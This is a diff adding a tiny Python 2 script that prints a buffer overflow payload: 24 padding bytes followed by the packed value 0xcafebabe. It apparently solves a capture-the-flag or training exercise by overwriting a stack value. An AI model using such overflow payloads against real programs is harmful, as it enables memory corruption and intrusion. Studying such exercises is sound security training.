@@ -1,0 +1,5 @@
+import struct
+# print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
+payload = "AAAABBBBCCCCDDDDEEEEFFFF"
+value = struct.pack('<I', 0xcafebabe)
+print payload+value
